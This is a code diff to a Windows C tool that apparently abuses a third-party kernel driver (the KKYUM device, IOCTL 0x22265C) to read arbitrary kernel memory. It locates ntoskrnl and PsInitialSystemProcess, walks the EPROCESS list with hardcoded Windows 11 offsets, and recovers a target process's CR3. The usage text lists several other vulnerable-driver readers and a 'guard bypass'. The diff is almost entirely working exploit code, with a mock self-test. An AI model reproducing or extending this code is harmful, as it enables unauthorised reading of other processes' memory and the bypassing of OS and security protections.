@@ -19,6 +19,7 @@
 // without touching locator/translator.
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
+#include <psapi.h>
 #include <bcrypt.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -381,6 +382,172 @@ static int mb_layer_locate_cr3_scan(mb_phys_reader *r, uint64_t range_start, uin
 }
 
 // ---------------------------------------------------------------------------
+// 定位层策略 3: kernel-VA reader (KKYUM) + 进程链表遍历
+// 这条路径不依赖取数层（物理读）；只依赖内核 VA 读 provider。
+// ---------------------------------------------------------------------------
+typedef struct mb_kernel_reader mb_kernel_reader;
+struct mb_kernel_reader {
+    void *ctx;
+    int (*read)(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size);
+};
+
+// Walk System EPROCESS -> ActiveProcessLinks list -> target EPROCESS -> CR3.
+// Offsets are supplied by the caller (Win11 26200: pid=0x1D0, links=0x1D8, dtb=0x28).
+static int mb_layer_locate_cr3_kernel(mb_kernel_reader *kr, uint64_t system_eproc_va, uint32_t pid,
+                                      uint32_t links_off, uint32_t pid_off, uint32_t dtb_off,
+                                      uint64_t *out_cr3, uint64_t *out_eproc) {
+    uint64_t dtb = 0;
+    if (pid == 4) {
+        if (!kr->read(kr, system_eproc_va + dtb_off, &dtb, 8) || !dtb || (dtb & 0xFFF)) return 0;
+        *out_cr3 = dtb;
+        if (out_eproc) *out_eproc = system_eproc_va;
+        return 1;
+    }
+    uint64_t start = system_eproc_va + links_off, link = 0;
+    if (!kr->read(kr, start, &link, 8) || link < 0xFFFF800000000000ull) return 0;
+    for (int i = 0; i < 4096; i++) {
+        uint64_t node = link - links_off;
+        uint32_t v = 0;
+        if (!kr->read(kr, node + pid_off, &v, 4)) return 0;
+        if (v == pid) {
+            if (!kr->read(kr, node + dtb_off, &dtb, 8) || !dtb || (dtb & 0xFFF)) return 0;
+            *out_cr3 = dtb;
+            if (out_eproc) *out_eproc = node;
+            return 1;
+        }
+        uint64_t next = 0;
+        if (!kr->read(kr, node + links_off, &next, 8)) return 0;
+        if (next == start) return 0;
+        link = next;
+        if (link < 0xFFFF800000000000ull) return 0;
+    }
+    return 0;
+}
+
+// Mock kernel VA memory, used by --selftest-mock.
+typedef struct { uint8_t *mem; uint64_t base; uint64_t size; } mock_kva;
+static int mock_kva_read(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
+    mock_kva *m = (mock_kva *)kr->ctx;
+    if (!m || !m->mem || va < m->base) return 0;
+    uint64_t off = va - m->base;
+    if (off > m->size || size > m->size - off) return 0;
+    memcpy(buf, m->mem + off, size);
+    return 1;
+}
+
+// Real kernel-reader provider: KKYUM.sys device (IOCTL 0x22265C).
+static HANDLE g_kkyum = INVALID_HANDLE_VALUE;
+static int kkyum_open(const char *device) {
+    const char *path = (device && device[0]) ? device : "\\\\.\\KKYUM";
+    g_kkyum = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    return g_kkyum != INVALID_HANDLE_VALUE;
+}
+static int kkyum_kread(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
+    (void)kr;
+    if (g_kkyum == INVALID_HANDLE_VALUE) return 0;
+    uint8_t in[32];
+    DWORD ret = 0;
+    memset(in, 0, sizeof(in));
+    *(uint32_t *)(in + 0) = GetCurrentProcessId();
+    *(uint32_t *)(in + 4) = 1;
+    *(uint64_t *)(in + 8) = va;
+    *(uint64_t *)(in + 16) = (uint64_t)(uintptr_t)buf;
+    *(uint64_t *)(in + 24) = size;
+    return DeviceIoControl(g_kkyum, 0x22265Cu, in, sizeof(in), NULL, 0, &ret, NULL) ? 1 : 0;
+}
+
+// ---------------------------------------------------------------------------
+// 定位层策略 3 辅助: ntoskrnl base + PsInitialSystemProcess export
+// ---------------------------------------------------------------------------
+static uint32_t nt_rva_to_off(uint8_t *img, uint32_t size, uint32_t rva) {
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
+    if (size < sizeof(IMAGE_DOS_HEADER) || dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
+    if ((uint8_t *)nt + sizeof(IMAGE_NT_HEADERS64) > img + size) return 0;
+    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (rva >= sec[i].VirtualAddress &&
+            rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
+            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
+    }
+    return rva;
+}
+
+static uint32_t parse_nt_export_rva(const char *name) {
+    FILE *f = fopen("C:\\Windows\\System32\\ntoskrnl.exe", "rb");
+    if (!f) return 0;
+    fseek(f, 0, SEEK_END);
+    long n = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    if (n <= 0) { fclose(f); return 0; }
+    uint8_t *img = (uint8_t *)malloc((size_t)n);
+    if (!img) { fclose(f); return 0; }
+    if (fread(img, 1, (size_t)n, f) != (size_t)n) { free(img); fclose(f); return 0; }
+    fclose(f);
+    uint32_t size = (uint32_t)n, out = 0;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
+    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
+        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
+        IMAGE_DATA_DIRECTORY *dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+        if (dir->VirtualAddress && dir->Size) {
+            uint32_t off = nt_rva_to_off(img, size, dir->VirtualAddress);
+            IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY *)(img + off);
+            uint32_t name_off = nt_rva_to_off(img, size, ed->AddressOfNames);
+            uint32_t ord_off = nt_rva_to_off(img, size, ed->AddressOfNameOrdinals);
+            uint32_t fun_off = nt_rva_to_off(img, size, ed->AddressOfFunctions);
+            for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
+                uint32_t no = nt_rva_to_off(img, size, ((uint32_t *)(img + name_off))[i]);
+                if (strcmp((const char *)(img + no), name) == 0) {
+                    uint16_t ord = ((uint16_t *)(img + ord_off))[i];
+                    out = ((uint32_t *)(img + fun_off))[ord];
+                    break;
+                }
+            }
+        }
+    }
+    free(img);
+    return out;
+}
+
+static uint64_t find_ntoskrnl_base(void) {
+    DWORD needed = 0;
+    uint64_t base = 0;
+    if (!EnumDeviceDrivers(NULL, 0, &needed) || !needed) return 0;
+    LPVOID *arr = (LPVOID *)malloc(needed);
+    DWORD got = 0;
+    if (arr && EnumDeviceDrivers(arr, needed, &got)) {
+        int count = (int)(got / sizeof(LPVOID));
+        for (int i = 0; i < count; i++) {
+            char nm[MAX_PATH] = { 0 };
+            if (GetDeviceDriverBaseNameA(arr[i], nm, sizeof(nm)) &&
+                (_stricmp(nm, "ntoskrnl.exe") == 0 || _stricmp(nm, "ntkrnlmp.exe") == 0)) {
+                base = (uint64_t)(uintptr_t)arr[i];
+                break;
+            }
+        }
+    }
+    free(arr);
+    return base;
+}
+
+// Full kkyum locator: open device, find ntoskrnl, read PsInitialSystemProcess,
+// walk process list, return target CR3. No physical reader is used.
+static int kkyum_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3, uint64_t *out_eproc) {
+    if (!kkyum_open(device)) return 0;
+    uint64_t nt_base = find_ntoskrnl_base();
+    if (!nt_base) return 0;
+    uint32_t rva = parse_nt_export_rva("PsInitialSystemProcess");
+    if (!rva) return 0;
+    mb_kernel_reader kr;
+    kr.ctx = NULL;
+    kr.read = kkyum_kread;
+    uint64_t sys_eproc = 0;
+    if (!kr.read(&kr, nt_base + rva, &sys_eproc, 8)) return 0;
+    if (sys_eproc < 0xFFFF800000000000ull) return 0;
+    return mb_layer_locate_cr3_kernel(&kr, sys_eproc, pid, 0x1D8, 0x1D0, 0x28, out_cr3, out_eproc);
+}
+
+// ---------------------------------------------------------------------------
 // 定位层辅助：从注册表读取物理内存范围（HARDWARE\RESOURCEMAP\...\Physical Memory）
 // 这样物理扫描 locator 不需要用户手工提供范围，也不需要内核读驱动。
 // ---------------------------------------------------------------------------
@@ -532,6 +699,31 @@ static int selftest_mock(void) {
     check("定位层(locator)", "PID 4242 / MOCK.exe -> CR3=0x1000 (physical scan)", ok_loc);
     check("定位层(locator)", "fake EPROCESS PA=0x8000", ok_loc && eproc == 0x8000);
 
+    // 定位层 strategy 3 mock: kernel-VA reader + ActiveProcessLinks walk.
+    // This path uses no physical reader at all.
+    uint8_t *kmem = (uint8_t *)calloc(1, 0x3000);
+    int ok_kloc = 0;
+    if (kmem) {
+        const uint64_t kbase = 0xFFFF800000100000ull;
+        uint64_t ksys = kbase + 0x1000, ktgt = kbase + 0x2000;
+        *(uint32_t *)(kmem + 0x1000 + EP_PID) = 4;
+        *(uint64_t *)(kmem + 0x1000 + EP_DTB) = cr3;
+        *(uint32_t *)(kmem + 0x2000 + EP_PID) = 4243;
+        *(uint64_t *)(kmem + 0x2000 + EP_DTB) = 0x3000;
+        *(uint64_t *)(kmem + 0x1000 + 0x1D8) = ktgt + 0x1D8;
+        *(uint64_t *)(kmem + 0x2000 + 0x1D8) = ksys + 0x1D8;
+        mock_kva mk;
+        mk.mem = kmem; mk.base = kbase; mk.size = 0x3000;
+        mb_kernel_reader kr;
+        kr.ctx = &mk;
+        kr.read = mock_kva_read;
+        uint64_t kcr3 = 0, kep = 0;
+        ok_kloc = mb_layer_locate_cr3_kernel(&kr, ksys, 4243, 0x1D8, 0x1D0, 0x28, &kcr3, &kep) &&
+                  kcr3 == 0x3000 && kep == ktgt;
+        free(kmem);
+    }
+    check("定位层(locator)", "kernel-reader list walk -> CR3=0x3000 (no physical reader)", ok_kloc);
+
     // full pipeline: locate -> translate -> fetch
     uint64_t cr3b = 0;
     uint8_t pipe[64];
@@ -569,19 +761,21 @@ static void usage(void) {
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
+    printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
 }
 
 int main(int argc, char **argv) {
-    const char *kind = NULL, *device = NULL, *name = NULL;
+    const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL;
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
     uint32_t size = 0x40, pid = 0, expect_first = 0;
     int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
-    int do_ranges = 0, auto_ranges = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
         else if (strcmp(argv[i], "--device") == 0 && i + 1 < argc) device = argv[++i];
+        else if (strcmp(argv[i], "--kkyum-device") == 0 && i + 1 < argc) kkyum_device = argv[++i];
         else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) name = argv[++i];
         else if (strcmp(argv[i], "--expect-first") == 0 && i + 1 < argc) expect_first = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--pa") == 0 && i + 1 < argc) pa = _strtoui64(argv[++i], NULL, 0);
@@ -593,6 +787,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--scan-size") == 0 && i + 1 < argc) scan_size = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--read-phys") == 0) do_read_phys = 1;
         else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
+        else if (strcmp(argv[i], "--kkyum") == 0) use_kkyum = 1;
         else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
         else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
         else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
@@ -612,11 +807,18 @@ int main(int argc, char **argv) {
         printf("VERDICT=PASS\n");
         return 0;
     }
-    if (!kind) { usage(); return 6; }
+    if (!kind && !(use_kkyum && do_locate && !have_va)) { usage(); return 6; }
 
     mb_phys_reader r;
-    if (!reader_open(&r, kind, device)) return 3;
-    r.aux = expect_first;
+    int have_reader = 0;
+    if (kind) {
+        if (!reader_open(&r, kind, device)) return 3;
+        r.aux = expect_first;
+        have_reader = 1;
+    } else {
+        memset(&r, 0, sizeof(r));
+        r.dev = INVALID_HANDLE_VALUE;
+    }
 
     int rc = 0;
     if (do_read_phys) {
@@ -631,7 +833,15 @@ int main(int argc, char **argv) {
         free(b);
     } else if (do_locate) {
         uint64_t got_cr3 = 0, eproc = 0;
-        if (have_cr3) {
+        if (use_kkyum && pid) {
+            if (!kkyum_locate_cr3(pid, kkyum_device, &got_cr3, &eproc)) {
+                printf("[ERR] 定位层 kkyum failed (pid=%u): device/ntoskrnl/EPROCESS walk error\n", pid);
+                rc = 5;
+            } else {
+                printf("[OK] 定位层 kkyum: PID=%u EPROCESS=0x%llX CR3=0x%llX (kernel-VA walk)\n", pid,
+                       (unsigned long long)eproc, (unsigned long long)got_cr3);
+            }
+        } else if (have_cr3) {
             if (!mb_layer_locate_cr3_explicit(cr3, &got_cr3)) { printf("[ERR] bad explicit CR3\n"); rc = 5; }
             else printf("[OK] 定位层 explicit CR3=0x%llX\n", (unsigned long long)got_cr3);
         } else if (pid && (scan_size || auto_ranges)) {
@@ -662,13 +872,18 @@ int main(int argc, char **argv) {
             rc = 6;
         }
         if (!rc && have_va) {
-            uint8_t *b = (uint8_t *)calloc(1, size);
-            if (b && mb_layer_read_va(&r, got_cr3, va, b, size)) {
-                printf("[OK] 翻译+取数 VA=0x%llX -> %u bytes\n", (unsigned long long)va, size);
-                for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
-                printf("\nVERDICT=PASS\n");
-            } else { printf("[ERR] read VA failed\n"); rc = 5; }
-            free(b);
+            if (!have_reader) {
+                printf("[ERR] --va read requires a 取数层 --reader (kkyum locator supplies CR3 only)\n");
+                rc = 6;
+            } else {
+                uint8_t *b = (uint8_t *)calloc(1, size);
+                if (b && mb_layer_read_va(&r, got_cr3, va, b, size)) {
+                    printf("[OK] 翻译+取数 VA=0x%llX -> %u bytes\n", (unsigned long long)va, size);
+                    for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
+                    printf("\nVERDICT=PASS\n");
+                } else { printf("[ERR] read VA failed\n"); rc = 5; }
+                free(b);
+            }
         }
     } else if (have_cr3 && have_va) {
         uint8_t *b = (uint8_t *)calloc(1, size);
@@ -692,6 +907,6 @@ int main(int argc, char **argv) {
         rc = 6;
     }
 done:
-    reader_close(&r);
+    if (have_reader) reader_close(&r);
     return rc;
 }
